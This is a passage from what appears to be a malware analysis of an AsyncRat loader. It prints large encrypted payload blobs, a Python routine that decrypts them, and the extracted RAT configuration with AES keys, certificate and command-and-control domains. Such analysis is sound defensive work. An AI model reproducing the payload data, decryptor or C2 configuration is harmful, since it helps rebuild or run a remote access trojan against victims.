i5a/Viewi1EQSxZ32sd5WHArygZpH+vS7q7GpQelGuoKgj0LFGb9Zm8SdBNKboEgVINt2XzaR/xJjQSJdSj80utWVJjtNtvQHYXNPomW0oQjhi9VimWX00JDPerr4NjdfB08WevI2o6fheWcX/23lQAxbrwdHbyuKVQKWmfVJLrDM62Dqndd+GhHL+2VcRHBKob0MJ068MqexyCEf5RRx/9d5Ek8591D497xIXNMVfijS71nNMv1GgNe0hYFnxGp8pL7tOTXZfa80kCTPnAKYcPtCalmrgYDaIHEUzaU/Q6fHB0oUyyH+Px33Ba/7hla+FGyFIKzm6wX7FYGRAsdEWJ0nbEwbmLtVz+dFcBZBcGBbHAEXGJMJDWUDiSHF+cYoEtepNqM+Mlz3Myw+s+n493u96hHJAtiyXpKeQNFHKJF+FGfKkjzMT2hOSjjdxvlFdQ1Dxm0po3HJScWh/J3FDqPac80LdjSwmzSWZGInUdq+tMrr768HI7SXL9EDW9Df0qOxP3X+QHuvLkii5QS+4QOgklIJb/CUht2RievQQdY1qeR5lTJtQ7WFfZpGqojb7GT6VhH5Wie/VIONKvM11jfli5ygNXMGRELMZd0tORlBicJ/N+htVMDsQQsp0uIrmJNSCxQvMGlazFD5qKqbKsDEjJd1XY1fWNVU0yHIXiFX7u81/2xrfOzIf00QhvO5RcKPWlwvyOLzXcTclIv9pBY3w7Or92uDO2sY5Zm+Q+Ui+kn6fCses8WQ6S6IsdIRJ0frCDolOQTLHb3xBFYPMmIWXb+ZNIKOKUFlXIdF2XLq0gNPNJQCPxlfbkysn4bXVroHMEJoyl+Apl345eX8Bz2fZObXgAit0zm5GWHtFw4W3NTZEWNVfZ6zNobveOli3P8YzLo6SMANyq9NuUaJQZPi7g9NY4ILZiWVu0pdvO7P0Fumjc0QDsE7IlzGZNlcE7nAmXmIwWGwjet4vupeb9jT161JB4FnsNJfdvlQmXPRDmcuCUVUzW/QQ1HGYIqdTFoF3CzM+fjqe4nZXWVyNtb/tdgkSryMnTQtQtRSaQKdBk7CfHUuRWAtoERP7MVYV8HM2gZ+YWXvCUcsfKurg2Kv/QT9NdaQGWKyMNMKMb54Qr4vabA/ZoAyIDpLixFV+eNOJkdWGlule0PCnvLIMtNtWTZKDtNAjqnLHR/t9ym0igHAiaR2KNXA7RVMfmMOJ1CJiNFIZn7r1NMUILr1CaXrdYEZn5m/y2twGJWPhtgh4oQo+KLpf2Py+imVqZLr3Bbj592oa2vosOctmDGKqomUbDmPvrji5qppm9dlroJNENC3Yc8v/Oa2HH0LZUPG+jwBP5HRwtCbTCgZiQM7DqeCFzeBSTBAJ66nRGvlGfIm0JQXlLHzYoZyEO/REiujRkicrgD5UA6QOuthpgh2lMsBMOPbJYdIhRFUYVKLd8KwKDxOmII0prwKiNHc/gravLfAVKCJFGHOjakJBCFX2IUvz0xHwN870AOysvfFdaMPtlw46AzSa4ZMEIiIJGlHWiIcRwSsqBxxZi9ARN1SGx5jXrlREJ/HHJPBzFs0eRxrRMWSDfjTH/UroZTHMI67KB0fODnw0FxUxwPoO/+nPN4CVlDJ4FykK+Q0OpKab7OqAMBQyNKxR+3WKyNmLEAWmFDgPCCEip1kVllWX+NQpZRer5RV9LEL9EWUf6JHEISgEm1tw2N28t9//b81Gzid30xHMJ==&quot; def cipher(input, key, encipher): for i in range(len(key)): if not key[i].isalpha(): return None text = &#39;&#39; num = 0 for j in range(len(input)): if input[j].isalpha(): flag3 = input[j].isupper() c = ord(&#39;A&#39;) if flag3 else ord(&#39;a&#39;) num2 = (j - num) % len(key) num3 = ord(key[num2].upper()) - ord(&#39;A&#39;) num3 = num3 if encipher else -num3 char_code = ord(input[j]) - c decrypted_code = (char_code + num3) % 26 text += chr(decrypted_code + c) else: text += input[j] num += 1 return text s1 = cipher(data, &#39;gmjzf&#39;, False) s2 = base64.b64decode(s1) out = gzip(s2) out[:200] . b&#39; xe8 x8b&#34; x01 x00 x8b&#34; x01 x00 xa0 xcf2: x8cZs xd2 xf3x xd8 xf4a xacm xb7 x06l xc3 xd4 x91 xae9=2L xc5- x1ch_ x00 x00 x00 x00Ih xf36 x92[ xf4 x0f]o x13Ah x02 xbcZq xfd x1e xa2Rt# xa9Zu xd3f xb1 xd7 x90 xe4 xb4 x9c{ xcc[ x1e xc1W xdfFT xf4 xab x12$ xbf x8a xea x05 x05ln xf9 xad r xb6y x9a x03 xeaOY x0f xea xfc xa0 xdad xc1 xec6 xedv=,2 r x15 xc4 xe4V xbe xf2 xd1 rb x03 x9b x04 x01? xa4E xce x90~ xf1 xdd x88 xe8 x86 xd8 x91 xdd, xbfAQL x0e x17 xa0Z x95 x86p xd1 x9c xcd x0b x89K!c xfc &#39;s xa0 xcb xa0 xfaVf xaa x93 xe1n:,&lt; xc2 x99$ xdbO- x98 xf2 xa1 xa9 xa5 &#39;&#39; . Payload . The final payload is decrypted using the same method as the shellcode, then loaded reflectivly into the .NET process. . Once decoded the payload can be identified as AsyncRat 1f8aa942a2102491fdf08b9ea81198d93cc26a7ced0febaacebe7a134dd794cd using the following config. . Version v0.2 Version false Key 4d4c6f426a445a6a30446e385a4e45534770537a31755a4d725048784663474f Mutex afgj6j3umd5uk Certificate MIIE8jCCAtqgAwIBAgIQAJOLtOK4DcqnHaZsqyb4cTANBgkqhkiG9w0BAQ0FADAaMRgwFgYDVQQDDA9FViBHZW9UcnVzdCBpbmMwIBcNMjIwMzAxMTIyNjU5WhgPOTk5OTEyMzEyMzU5NTlaMBoxGDAWBgNVBAMMD0VWIEdlb1RydXN0IGluYzCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBAK68Xd0MO8EW/+d8NOBCPuJuyO6tuOargdvVl0gBkk/JeQiexuiOFRlnHrqlkKWbMIfUeVZ7VEwdUCiFWWOwrMk+2/zdo5tf73XwxN8FYP+o6wyNJ+jApllatvxkRpvYnZeOzPR3wxUDvcBdyv/Lmd8drY94yT+kX9mSCizCsg5OiVuZeL/CuMrE2+OhB/tngSx+2LmShOWTAmXWbwzoQaShBjguZq23qQQ5cPIKfwU4K6wjeo3LV6PQ7oGaQYjuzRtfPOSsLWQNFxtlBXFVb7wnRBouX52Yqf6EHh54AX9WI9gI5LjZPzGgn3RIGC4smQdy9nqI8lUFOaitpv+TjLV5RXfd+NWcckditqj1OzYwaaoaC2pteIc+Hc+VSL/kGa8tFv3UOvr1ftjEitehb+7YFjKjWWs6tO63zOQbxeUOXWLFSYG94zKQjrTxxK3UsIpcYnoxTakpaHTDY9++6jjxl3Uo6mEGxKl6NxSsRKwH418YN331o2HlOHZLo1J2tjH3y5f1NT2Fcsw25H+h6zbtbMZi2rEI8/HcC4lA5rhPKcM4RmGdP5T/WNDQ1ZioF5bl3C1Tay8OEjj6PWogRC23IsrHIzWSuH3ne6YmWG9ClbV6kAd7UMP/kAG0OUdpiR443gTM23StBUDPkXeHXL3AkGK1j96odpHCXawdrJsVAgMBAAGjMjAwMB0GA1UdDgQWBBQ3RU6dfDrM0DLMHoGzrGEwPuYtnjAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBDQUAA4ICAQBXZsZQbk9Cxj1RoiRc9f0FoaqFvrPo67g1cplPrabhcSekgEnh92QcrOqt42cVdW/0aXaEpW+YrlTGwVS2NdrbHUfeyUzQTgsbrF8GKreV5BwlFlY3ZeUsRIj9LG012X2iZ7Z6VJ6/IFa+UAnX7wed9DspiavtrPxR1k2Upiwm86L0yVN6ILKpzfXwqJq1mi0cKYVl0jp78VEVgqOmi+NUzGZzreeIdCcMf/4r7UOFvRz8GV44TUpaubAHz9+DGcVVfiol4ZMsGq+Lra5zxkAFUTPbUAta/8Lv2Os39Sj/Nn2P8hYktKuIx6YrgANDhZdEG1PXJFnOLoOZICyzbwTf0nHU4Ptu4FbzCdkDNc9Glb1aUrJAEqu8g+iIe1lY9iWUnklZbT2KG6ydjY+n5NJG3OUDAS0eWD9qb9uG/xeSZx0J4AQSywzcKz6CW7YWU6iXJ/Hl7dpTzuFKdsxNeZGRFC250V6zoiVwR95jsnD5g4xR/waDLmpz6sNItNtwT+O5euEbBjKMSVuTKhoiUG2t3iWqGvK3h+B4cx4OJdG+314fTJVcbADBpl83Eq9vQC+sZdgg8+gPvfhuux04ZdcINPdRun4qijAAcAKbtBOWt4OEiP+34tEJDqCJnKfhLIsY6SEaBpzQ8R1M1dTFijuBVUxXjUwJQnJgBlgVMN4hsw== Server Signature YSHRQJ0YRcQoYftOHCm8Z0sEClc8gseGQyUBnKZMXSt01o0rCRReToIimjbPJyGvGHCgu2kHsHtz54BlrLjYpnSLwV6DzfHC4KEMLb7mikgBRKYOpNxE/hP9Z0b2cIlpl5nhgg2R/k/4L2b5pUDqJyuJ5IC2rTCQEbkvl3kbKQt78K0sO3jMFcZb6HaJAXRYimTYnrYRI2JrdsnCau89JA22rLZJPygPaUXYEBNl4BfCNOnfyvFLowinjX4C8zJdWD2GzKrH8SEJOZfxrIef3nPgI0u+ppadWT1NAJXrV5SR8T/nBkqQcNJUVlxYNIFRoJ4Xkpq45MdbeIiTUqHhJNOXjM7aEsqr5BFD/kz7PlkSm9gzeOIkVdX9fAPhiXwmpJ2EWUGrgWSDO5/6K8enpnZdbdsIAT2ZeA7AojePGY3urWokyO7oSpQXaszdypmi212+YI992SflsFLHkK/Hgy2pAL7+LdCMSzAfhCpl4NET+Vj5c9UQglIHlvW1Xgm0A7G8ACi3ygn1D8DEMBEW9UK3Y7TG1E0U3rf5AZtBICkleS4pY8dnwlJjyjuCLBzkBZrgUNY5Hr2PNs2IxTYf5ulne2c8eV/Vc3eF2i8/9Dj6ijGiLOOQIyyfKOCDXhIp33vhmtQ7CSf/qbh/clOgLL5HzKmcMtZnDtJ1ry31oeM= Pastebin false Delay null Antiprocess false Group mar21_23 Aes Key 6083ac4b3de68f39834dae9ae4462fbdfdfc22f31f3aaa21115377cf6383448f Aes Iv bccd52cc531033c895e99fe923ac7669 Salt bfeb1e56fbcd973bb219022430a57843003d5644d21e62b9d4f180e7e6c33941 C2s chimpail[.]com:53245 aghbh73ehefiv787ywe8ads[.]com:53245 o8i9asf86v76t3y67t63gg[.]cn:53245 . Payload Decryption . data = &quot;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